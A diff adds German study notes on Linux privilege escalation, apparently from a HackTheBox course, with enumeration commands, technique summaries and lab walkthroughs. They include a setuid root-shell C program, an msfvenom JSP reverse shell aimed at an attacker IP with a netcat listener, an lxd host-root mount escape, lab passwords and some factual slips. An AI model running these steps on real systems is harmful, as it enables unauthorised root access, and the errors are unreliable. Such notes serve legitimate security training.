@@ -1,0 +1,389 @@
+Linux Privilege Escalation
+
+Introduction
+1. Introduction to Linux Privilege Escalation:
+- Der root Account hat die hoechsten Rechte in einem Linux Betriebssystem
+- Wenn der Rechner in einer Active Directory Domaine ist kann ein NTLM Hash abgefangen werden
+
+- Enumeration:
+	- LinEnum ist ein automatisches Tool fuer privilege Escalation
+	- Es ist wichtig manche Informationen zu bekommen:
+		- OS Version: Enthaelt die Distribution wie Ubuntu, Debian, SUSE usw.
+		- Kernel Version: Ruft die Kernel Version damit koennen wir nach Schwachstellen abrufen
+		- Running Services: Alle Services die miskonfiguriert sein koennen
+		- Installed Packages: Installierte Packages nach Schwachstellen angucken
+		- Logged in Users: Einloggte User ausgeben
+		- User Home Directories: In Home Directory befinden sich ssh Keys Script, bash history, config Dateien usw.
+		- Cron Jobs: Sind automatisierte Aufgaben auf Linux
+		- 
+
+
+- List Current Root Processes:
+	- ps aux | grep root
+
+- List Processes:
+	- ps au
+
+- Sudo - List User Privilege:
+	- Mit sudo -l koennen wir Befehle ausgeben die mit sudo Rechte ausfuehrbar sind
+
+- Passwd:
+	- /etc/passwd werden alle Passwoerter gespeichert
+	- Wenn die Passwoerter gehashed werden, werden diese Hashes in einer shadow /etc/shadow Datei gespeichert
+
+- Find Writable Directories:
+	- find / -path /proc -prune -o -type d -perm -o+w 2>/dev/null
+
+- Find Writable Files:
+	- find / -path /proc -prune -o -type f -perm -o+w 2>/dev/null
+
+###############################################################################################
+Local Privilege Escalation Techniques:
+1. Kernel Exploits:
+- Kernel Exploits kommen haeufig vor 
+- Mit uname -a kann die Version des Betriebssystem ausgegeben werden
+- Jetzt koennen wir nach Exploits in Google suchen
+
+2. Vulnerable Services:
+- Viele Services koennen verwendet werden um neue Privilegien zu bekommen
+- Die Version des Services suchen und bei Google nachschauen
+
+3. Cron Job Abuse:
+- Cron Jobs werden beim Boot Vorgang ausgefuehrt
+- Der crontab Befehl erstellt cron files
+- Die Cron Jobs Files werden in /var/spool/cron gespeichert
+- Crontab Files koennen meistens nur von root Usern editiert werden
+- Wenn wir eine Datei finden die ein cron job enthaelt koennen wir
+- Viele Anwendungen erstellen ein cron file in dem /etc/cron.d Verzeichniss
+
+- Wir koennen mit pspy sicherstellen, dass ein laufende Prozesse zu finden ohne root Rechte
+- Wie koennen hiermit cron jobs finden nach einer bestimmten zeit
+- ./pspy64 -pf -i 1000
+
+4. Special Permissions:
+- Das Set User ID upon Execution(setuid) Recht erlaubt es einem User ein anderes Programm von einem anderen User auszufuehren
+- Das setuid bit wird als s ausgegeben
+- Alle Dateien mit setuid Recht aufeben
+	- find / -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/null
+
+- Die Set Group ID Rechte geben dir das Recht binaries laufen zu lassen mit den Rechten der Gruppen die es erstellt haben
+	- find / -user root -perm -6000 -exec ls -ldb {} \; 2>/dev/null
+
+- GTFOBins:
+	- GTFOBins ist ein Projekt welche Bypasses fuer Sicherheitsrestriktionen beinhaltet
+
+5. Sudo Rights Abuse:
+- Mit sudo kann ein Befehl mit root Befehlen ausgefuehrt werden
+- Mit sudo -l koennen wir die Sudo Privilegien pruefen
+- Alle Eintraege mit NOPASSWD Eintrag koennen wir ohne Passwort als sudo ausfuehren
+
+6. Path Abuse:
+- PATH ist eine Umgebungsvariable, inder die Orte fuer ausfuehrbare Dateien 
+- Die Variable kann mit echo $PATH ausgegeben werden
+- Wir koennen einen .: zu PATH hinzufuegen und damit Befehle im eingenen Verzeichnis auszufuehren
+	- PATH=.:${PATH}
+	- export PATH
+	- echo $PATH
+	- Jetzt koennen wir einen Befehl wie ls mit eigenen Code hinterlegen
+		- touch ls
+		- echo 'echo "PATH ABUSE!!"' > ls
+		- chnod +x ls
+
+7. Wildcard Abuse:
+- Wildcard Zeichen koennen mit anderen Zeichen augetauscht werden
+
+8. Credential Hunting:
+- In /var stehen viele Konfigurationsdateien
+- Wir koennen alle Konfigurationsdateien suchen:
+	- find / ! -path "*/proc/*" -iname "*config*" -type f 2>/dev/null
+- Wir koennen die ssh Keys in ~/.ssh finden
+
+9. Shared Libraries:
+- In Linux werden oft Libraries verwendet
+- Es gibt 2 Arten von Libraries static libraries(.a Dateiendung) und dyanmically linked shared object libraries(.a Dateiendung)
+- Eine static libraries kann waehrend des Programmlaufen nicht geaendert werden eine dynamic libraries kann waherend das Programm laeuft veraendert werden
+- Mit ldd koennen die Libraries fuer das Programm ausgegeben werden
+- Mit dem -rpath und -rpath-link koennen wir die Libraries fuer ein Programm spezifizieren
+- Die Libraries werden durch die Umgebungsvariablen LD_RUN_PATH und LD_LIBRARY_PATH definiert
+- Die Umgebungsvariable LD_PRELOAD wird vor allen ausgefuehrt
+
+- LD_PRELOAD Privilege Escalation:
+	- LD Preload kann ausgenutzt werden indem eine Librarie geschrieben werden kann
+	- gcc -fPIC -shared -o root.so root.c -nostartfiles
+	- root.so ist die Librarie
+	- sudo LD_PRELOAD=<Librarie_Name> <Programm ohne sudo Rechte>
+
+10. Shared Object Hijacking:
+- Es ist moeglich Libraries vorzuladen
+- Mit readself koennen die Verzeichnisse fuer Libraries gezeigt werden 
+	- readelf -d <Programm>  | grep PATH
+- Wenn dieses Verzeichnis aenderbar ist kann hier ein Librarie mit Schwachstellen eingefuegt werden
+
+11. Priviliged Groups:
+- Durch Gruppen koennen Zugriffe auf manche Verzeichnisse erlaubt sein die nicht erlaubt sollen 
+
+12. Miscellanuous Techniques:
+- Passive Traffic Capture:
+	- Mit tcpdump koennen wir Netzwerktraffic abgreifen und mit Tools wie net-creds und PCredz die Daten interpretieren
+
+- Weak NFS Privileges:
+	- Mit Network File System(NFS) koennen Verzeichnisse und Dateien ueber ein Netzwerk teilen
+	- Mit showmount -e koennen wir die NFS anzeigen lassen
+	- In /etc/exports koennen die NFS Konfiguration angezeigt werden
+	- NFS hinzufuegen:
+		- Shell File:
+			#include <stdio.h>
+			#include <sys/types.h>
+			#include <unistd.h>
+			int main(void)
+			{
+			  setuid(0); setgid(0); system("/bin/bash");
+			}
+		- gcc shell.c -o shell
+		- sudo mount -t nfs <IP>:/tmp /mnt
+		- cp shell /mnt
+		- chmod 777 /mnt/shell
+
+###############################################################################################
+Linux Local Privilage Escalation - Skills Assessment:
+1. 
+- cat .config/.flag1.txt
+
+2. 
+- /home/barry flag ausgeben
+- cat /home/barry/.bash_history
+	- sshpass -p 'i_l0ve_s3cur1ty!' ssh barry_adm@dmz1.inlanefreight.local
+- ssh barry@<IP> mit Passwort i_l0ve_s3cur1ty!
+
+3. 
+- cd /var/log
+- grep -ri LLPE
+
+4. 
+- ps aux
+tomcat       770  0.3  7.3 3083080 150172 ?      Ssl  12:52   0:26 /usr/lib/jvm/default-java/bin/java -Djava.util.logging.conf
+
+- find / ! -path "*/proc/*" -iname "*tomcat*" -type f 2>/dev/null
+/etc/tomcat9/tomcat-users.xml.bak
+	-  <user username="tomcatadm" password="T0mc@t_s3cret_p@ss!" roles="manager-gui, manager-script, manager-jmx, manager-status, admin-gui, admin-script"/>
+
+- http://10.129.58.189:8080/manager/html
+
+- msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.15.206 LPORT=4444 -f war > reverse.war
+- nc -lvnp 8888
+
+5. 
+- Logged in User with Reverse Shell
+- python3 -c 'import pty; pty.spawn("/bin/bash")'
+
+- sudo -l
+- sudo busctl --show-machine
+  !/bin/sh
+
+###############################################################################################
+Information Gathering
+1. Enviroment Enumeration:
+- Mit Scripts wie LinPEAS und LinENUM koennen wir Informationen aus dem System wie OS Version, Kernel Version usw abfangen
+
+- Mit folgenden Befehlen koennen wir uns in einem System orientieren:
+	- whoami: Welcher User ist eingeloggt
+	- id: Zu welcher Gruppe gehoert der User
+	- hostname: Name des Server/Host
+	- ifconfig: Gibt die Informationen der Netzwerkkarte mit Subnetzen usw aus
+	- sudo -l: Kann der User als sudo Anwendungen ausfuehren
+
+- Mit cat /etc/os-release koennen Informationen ueber das System ausgegeben werden
+- Mit echo $PATH kann der Umgegunspfad ausgegeben werden
+- Mit env koennen alls Umgebungsvariablen ausgegeben werden
+- Mit uname -a kann koennen die Systeminformationen ausgegeben werden
+- Mit lscpu werden die Informationen ueber den Prozessor aus
+- Mit lsblk (list block devices) Listet alle Speichermedien auf
+- Mit lpstat werden die Netzwerkdrucker aus
+- Mit route oder netstat -rn werden die IP Routen ausgegeben
+- arp -p gibt wird die ARP Tabelle ausgegeben
+- Mit cat /etc/passwd werden alle User ausgegeben
+- cat /etc/group gibt die existierenden User uas
+- getent listet Mitglieder der Gruppen aus
+	- getent group sudo
+
+- All Hidden Files:
+	- find / -type f -name ".*" -exec ls -l {} \; 2>/dev/null | grep <User>
+
+- All Hidden Directories:
+	- find / -type d -name ".*" -ls 2>/dev/null
+
+2. Linux Services & Internals Enumeration:
+- Wie enumerieren das System und die Services
+
+- Internals:
+	- Network Interfaces:
+		- Netzwerkinformationen lassen sich mit "ip a" anzeigen.
+			- Gibt alle Interfaces aus
+		- Hosts:
+				- "cat /etc/hosts" gibt alle Hostnamen und Adressen aus andere Hosts im Netzwerk
+		- User Last Login:
+			- "lastlog" gibt den letzten Login fuer verschiedene User aus
+		- Logged in Users:
+			- "w" gibt eingeloggte User aus
+		- Command History:
+			- "history" gibt die Befehlshistorie aus
+		- Finding History Files:
+			- "find / -type f \( -name *_hist -o -name *_history \) -exec ls -l {} \; 2>/dev/null" gibt versteckte Dateien aus
+		- Find Cron Jobs:
+			- "ls -la /etc/cron.daily/" Gibt alle Cron Jobs aus
+			- Cron Jobs sind automatisch im Hintergrund laufende Skripts
+		- Proc:
+			- " find /proc -name cmdline -exec cat {} \; 2>/dev/null | tr " " "\n" "
+			- Proc ist ein Dateisystem welches Informationen ueber laufende Prozesse enthaelt
+
+- Services:
+	- Installed Packages:
+		- "apt list --installed | tr "/" " " | cut -d" " -f1,3 | sed 's/[0-9]://g' | tee -a installed_pkgs.list" listet alle installierten Pakete auf
+		- Sudo Version:
+			- "sudo -V" gibt die Sudo Version aus
+		- Binaries:
+			- Binaries sind Programme die ausfuehrbare Programme auf einem Unix System
+			- "ls -l /bin /usr/bin/ /usr/sbin/" gibt die Binaries aus
+			- Mit GTFObins laesst sich pruefen ob einer dieser Binaries exploitbar ist
+		- Configuration Files:
+			- "find / -type f \( -name *.conf -o -name *.config \) -exec ls -l {} \; 2>/dev/null" gibt alle Config Dateien aus
+		- Scripts:
+			- " find / -type f -name "*.sh" 2>/dev/null | grep -v "src\|snap\|share" " gibt alle Scripts aus
+		- Running Services by User:
+			- "ps aux | grep <Username>" Gibt laufende Services fuer den User aus
+
+		- Frage:
+			- dpkg -l | grep "python"
+
+#################################################################################################
+Escaping Restricted Shells:
+- Eine restricted Shell ist eine Shell mit begrenzten Rechten
+- Es erlaubt nur manche Befehle oder Zugriff auf manche Verzeichnisse
+
+- Shells:
+	- RBASH:
+		- Restricted Bourne Shell(rbash) ist eine begrenzte Bourne Shell
+
+	- RKSH:
+		- Restricted Korn Shell(rksh) ist eine begrenzte Korn Shell
+
+	- RZSH:
+		- Restricted Z shell(rzsh) ist eine begrenzte Z Shell.
+
+	- Meistens werden alle 3 verwendet fuer verschiedene Anlaesse
+
+- Escaping:
+- Aus einer restricted Shell kann ausgebrochen werden
+
+	- Command Injection:
+		- In den erlaubten Befehl koennen andere Befehle inkludiert werden
+		- Ein Beispiel waere "ls -l `pwd`"
+
+	- Command Substitution:
+		- Wenn die Shell ` Zeichen erlaubt koennen hiermit Befehle zusammengesetzt werden
+	
+	- Command Chaining:
+		- Mit ; oder | koennen Befehle miteinander verbunden werden
+		- Hiermit koennen auch Regeln umgangen werden
+
+	- Environment Variables:
+		- Umgebungsvariablen koennen beschrieben und dann ausgenutzt werden um so auszubrechen
+
+	- Shell Functions:
+		- Wir koennen eine Shell aufrufen die nicht begrenzt ist
+
+- Frage
+	- enable: Gibt erlaubt Befehle aus
+	- echo *
+	- while read -r line; do echo $line; done < /home/htb-user/flag.txt
+
+####################################################################################
+Container:
+- Container operieren auf dem Hardwarelevel
+- Container ermoeglichen Ausfuehrung von Anwendungen unabhaengig von ihrer Hardware
+
+- Linux Containers:
+	- Linux Container(LXC) laufen auf einem Linux Host isoliert und teilen sich den Kernel
+
+	- Linux Daemon(LXD):
+		- Umfaengt das gesamte Betriebssystem und ist deshlab ein System Container
+
+- Docker:
+	- Docker ermoeglicht Anwendungen in Containern laufen zu lassen auf einem Computer
+	- Docker Socket befinden sich meistens in /var/run/docker.sock
+
+- Kubernetes:
+	- Kubernetes ist fuer die Verwaltung von Container zustaendig
+
+- Frage:
+	- id: lxd
+	- lxc image import alpine-v3.18-x86_64-20230607_1234.tar.gz --alias ubuntutemp
+	- lxc init ubuntutemp privesc -c security.privileged=true
+	- lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true
+	- find / -name "flag.txt"
+	- cat /mnt/root/root/flag.txt
+
+#######################################################################
+Logrotate:
+- logrotate ist ein Tool welches alte Logs archiviert
+- In /var/logs werden die Logs gespeichert
+- In /etc/logrotate.conf wird festgelegt wie haeufig rotiert wird
+- Mit logrotten(https://github.com/whotwagner/logrotten) kann dieses Tool exploited werden
+
+- Frage:
+	- find / -type f -name "*.log" -print0 2>/dev/null | while read -d $'\0' file; do if [ -w "$file" ]; then echo "You have write privileges for: $file"; fi; done
+		- /home/htb-student/backups/access.log
+
+
+
+#######################################################################
+Capabilities:
+- Capabilities erlauben es das Prozesse verschiedenste Privilegien haben
+
+- Set Capability:
+	- Mit setcap koennen diese Privilegien geaendert koennen
+	- Es gibt viele verschiedene Capabilities wie: cap_sys_admin, cap_sys_chroot usw.
+	- Zum Befehl setcap gehoeen auch Capability Values wie: +ep, +ei usw.
+
+- Enumerating Capabilities:
+	- Capabilities koennen wir im System fuer die jeweiligen Binaries suchen 
+	- find /usr/bin /usr/sbin /usr/local/bin /usr/local/sbin -type f -exec getcap {} \;
+
+- Exploitation:
+	- Wenn von Binaries die Capabilities abfragen mit getcap
+	- getcap <Binarie>
+
+#######################################################################
+Docker
+- Docker ist ein Open-Source Tool mit dem Software Anwendungen in einem Container gelaufen werden kann
+- Ein Container funktioniert in etwa so wie eine Virtuelle Maschine nur ohne den ganzen Overload
+
+- Docker Architecture:
+	- Docker besteht aus einem client-server Modell
+	- Besteht aus einem Docker Daemon und einem Docker Client
+
+- Docker Daemon:
+	- Docker Daemon ist der Server im Docker System
+	- Der Docker Daemon verwaltet und interargiert mit Containern auf dem Host System
+
+- Docker Clients:
+	- Wenn wir mit Docker interargieren tun wir das durch ein Befehl durch den Docker Client mit der RESTful API oder Unix sockets
+
+- Docker Images and Containers:
+	- Docker Images sind blueprints fuer ein Container in den eine Anwendung laeuft
+	- Wir erstellen ein image durch ein Dockerfile
+
+#######################################################################
+Logrotate:
+- Alle Linux System loggen viel mit
+- Um vorzubeugen, dass die Festplatte zumuellt wird ein Tools wie logrotate verwendet
+- Die Log Daten sind in /var/log gespeichert
+- Die Konfiguration von Logrotate befindet sich in /etc/logrotate.conf
+- Um einen neue Rotation zu erzwigen koennen wir die -f Option verwenden
+- In dem Verzeichnis /etc/logrotate.d/ koenenn wir Log Dateien fuer verschiedene Anwendungen durchlesen
+
+- Exploiten:
+	- Write Rechte auf die Log Files
+	- logrotate muessen als privileged user oder root laufen
+	- Vulnerable Versions:
+		-  3.8.6, 3.11.0, 3.15.0, 3.18.0
